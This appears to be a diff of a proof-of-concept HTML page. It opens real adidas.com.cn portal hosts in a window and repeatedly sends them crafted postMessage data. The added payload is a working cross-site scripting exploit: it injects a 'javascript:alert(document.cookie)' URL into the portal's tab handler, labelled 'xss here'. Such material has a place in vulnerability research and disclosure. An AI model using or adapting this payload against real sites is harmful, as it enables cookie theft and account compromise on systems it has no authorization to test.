@@ -1,9 +1,9 @@
 <html>
 <body>
 <script>
-hwin = window.open("https://comtestsit.adidas.com.cn/");
+hwin = window.open("https://adifox.adidas.com.cn/portal/#/page/11");
 setInterval(function(){
- hwin.postMessage('_TINGYUN{"type":"gather","fromJS":"APM"}',"*")
+ hwin.postMessage('{"type":"portal_new_tab","c":11,"content":{"type":"iframe","url":"javascript:alert(document.cookie)", "table": 1, "title": "xss here", "query": "function"},"params":[{"id":1},"fdsa"]}',"*")
 },4000)
 </script>
 </body>
